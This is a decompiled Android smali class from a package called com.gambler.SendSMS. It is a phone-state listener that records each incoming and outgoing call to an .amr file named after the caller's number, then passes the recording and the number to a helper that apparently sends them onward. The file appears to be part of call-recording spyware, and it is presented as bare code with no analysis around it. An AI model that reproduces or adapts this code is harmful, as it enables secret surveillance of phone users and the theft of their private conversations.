.class final Lcom/gambler/SendSMS/b;
.super Landroid/telephony/PhoneStateListener;


# instance fields
.field private synthetic a:Lcom/gambler/SendSMS/SMSMonitor;


# direct methods
.method constructor <init>(Lcom/gambler/SendSMS/SMSMonitor;)V
    .locals 0

    iput-object p1, p0, Lcom/gambler/SendSMS/b;->a:Lcom/gambler/SendSMS/SMSMonitor;

    invoke-direct {p0}, Landroid/telephony/PhoneStateListener;-><init>()V

    return-void
.end method


# virtual methods
.method public final onCallStateChanged(ILjava/lang/String;)V
    .locals 5

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "incomingNumber == "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    invoke-super {p0, p1, p2}, Landroid/telephony/PhoneStateListener;->onCallStateChanged(ILjava/lang/String;)V

    packed-switch p1, :pswitch_data_0

    :goto_0
    :pswitch_0
    if-eqz p2, :cond_1

    invoke-virtual {p2}, Ljava/lang/String;->length()I

    move-result v0

    if-lez v0, :cond_1

    move-object v0, p2

    :goto_1
    iget-object v1, p0, Lcom/gambler/SendSMS/b;->a:Lcom/gambler/SendSMS/SMSMonitor;

    invoke-static {v1}, Lcom/gambler/SendSMS/SMSMonitor;->b(Lcom/gambler/SendSMS/SMSMonitor;)Z

    move-result v1

    if-eqz v1, :cond_2

    iget-object v1, p0, Lcom/gambler/SendSMS/b;->a:Lcom/gambler/SendSMS/SMSMonitor;

    iget-object v1, v1, Lcom/gambler/SendSMS/SMSMonitor;->a:Lcom/gambler/SendSMS/h;

    new-instance v2, Ljava/lang/StringBuilder;

    sget-object v3, Lcom/gambler/SendSMS/h;->a:Ljava/lang/String;

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v3, "/"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, ".amr"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    iget-object v2, p0, Lcom/gambler/SendSMS/b;->a:Lcom/gambler/SendSMS/SMSMonitor;

    invoke-virtual {v1, v0, v2}, Lcom/gambler/SendSMS/h;->a(Ljava/lang/String;Landroid/content/Context;)V

    :cond_0
    :goto_2
    return-void

    :pswitch_1
    iget-object v0, p0, Lcom/gambler/SendSMS/b;->a:Lcom/gambler/SendSMS/SMSMonitor;

    const/4 v1, 0x0

    invoke-static {v0, v1}, Lcom/gambler/SendSMS/SMSMonitor;->a(Lcom/gambler/SendSMS/SMSMonitor;Z)V

    goto :goto_0

    :pswitch_2
    iget-object v0, p0, Lcom/gambler/SendSMS/b;->a:Lcom/gambler/SendSMS/SMSMonitor;

    const/4 v1, 0x1

    invoke-static {v0, v1}, Lcom/gambler/SendSMS/SMSMonitor;->a(Lcom/gambler/SendSMS/SMSMonitor;Z)V

    goto :goto_0

    :cond_1
    iget-object v0, p0, Lcom/gambler/SendSMS/b;->a:Lcom/gambler/SendSMS/SMSMonitor;

    invoke-static {v0}, Lcom/gambler/SendSMS/SMSMonitor;->a(Lcom/gambler/SendSMS/SMSMonitor;)Ljava/lang/String;

    move-result-object v0

    goto :goto_1

    :cond_2
    iget-object v1, p0, Lcom/gambler/SendSMS/b;->a:Lcom/gambler/SendSMS/SMSMonitor;

    iget-object v1, v1, Lcom/gambler/SendSMS/SMSMonitor;->a:Lcom/gambler/SendSMS/h;

    invoke-virtual {v1}, Lcom/gambler/SendSMS/h;->c()V

    iget-object v1, p0, Lcom/gambler/SendSMS/b;->a:Lcom/gambler/SendSMS/SMSMonitor;

    iget-object v1, v1, Lcom/gambler/SendSMS/SMSMonitor;->a:Lcom/gambler/SendSMS/h;

    invoke-virtual {v1}, Lcom/gambler/SendSMS/h;->a()Ljava/io/File;

    move-result-object v1

    if-eqz v1, :cond_0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "recorder completed! file name == "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v2, p0, Lcom/gambler/SendSMS/b;->a:Lcom/gambler/SendSMS/SMSMonitor;

    iget-object v2, v2, Lcom/gambler/SendSMS/SMSMonitor;->a:Lcom/gambler/SendSMS/h;

    invoke-virtual {v2}, Lcom/gambler/SendSMS/h;->a()Ljava/io/File;

    move-result-object v2

    invoke-virtual {v2}, Ljava/io/File;->getPath()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "file size == "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget-object v2, p0, Lcom/gambler/SendSMS/b;->a:Lcom/gambler/SendSMS/SMSMonitor;

    iget-object v2, v2, Lcom/gambler/SendSMS/SMSMonitor;->a:Lcom/gambler/SendSMS/h;

    invoke-virtual {v2}, Lcom/gambler/SendSMS/h;->a()Ljava/io/File;

    move-result-object v2

    invoke-virtual {v2}, Ljava/io/File;->getPath()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/gambler/SendSMS/k;->a(Ljava/lang/String;)J

    move-result-wide v2

    invoke-virtual {v1, v2, v3}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, " mOutGoingNum == "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget-object v2, p0, Lcom/gambler/SendSMS/b;->a:Lcom/gambler/SendSMS/SMSMonitor;

    invoke-static {v2}, Lcom/gambler/SendSMS/SMSMonitor;->a(Lcom/gambler/SendSMS/SMSMonitor;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    iget-object v1, p0, Lcom/gambler/SendSMS/b;->a:Lcom/gambler/SendSMS/SMSMonitor;

    iget-object v1, v1, Lcom/gambler/SendSMS/SMSMonitor;->a:Lcom/gambler/SendSMS/h;

    invoke-virtual {v1}, Lcom/gambler/SendSMS/h;->a()Ljava/io/File;

    move-result-object v1

    invoke-virtual {v1}, Ljava/io/File;->getPath()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/gambler/SendSMS/k;->a(Ljava/lang/String;)J

    move-result-wide v1

    const-wide/16 v3, 0x0

    cmp-long v1, v1, v3

    if-lez v1, :cond_3

    :try_start_0
    iget-object v1, p0, Lcom/gambler/SendSMS/b;->a:Lcom/gambler/SendSMS/SMSMonitor;

    iget-object v1, v1, Lcom/gambler/SendSMS/SMSMonitor;->a:Lcom/gambler/SendSMS/h;

    invoke-virtual {v1}, Lcom/gambler/SendSMS/h;->a()Ljava/io/File;

    move-result-object v1

    invoke-virtual {v1}, Ljava/io/File;->getPath()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/gambler/SendSMS/k;->b(Ljava/lang/String;)La/a/a/h;

    move-result-object v1

    if-eqz p2, :cond_4

    invoke-virtual {p2}, Ljava/lang/String;->length()I

    move-result v2

    if-lez v2, :cond_4

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "Incoming call"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v2, "Incoming call"

    invoke-static {v1, v0, v2}, Lcom/gambler/SendSMS/k;->a(La/a/a/h;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_3
    :goto_3
    iget-object v0, p0, Lcom/gambler/SendSMS/b;->a:Lcom/gambler/SendSMS/SMSMonitor;

    iget-object v0, v0, Lcom/gambler/SendSMS/SMSMonitor;->a:Lcom/gambler/SendSMS/h;

    invoke-virtual {v0}, Lcom/gambler/SendSMS/h;->b()V

    goto/16 :goto_2

    :cond_4
    :try_start_1
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "Out going call"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v2, "Incoming call"

    invoke-static {v1, v0, v2}, Lcom/gambler/SendSMS/k;->a(La/a/a/h;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_3

    :catch_0
    move-exception v0

    goto :goto_3

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_1
        :pswitch_0
        :pswitch_2
    .end packed-switch
.end method
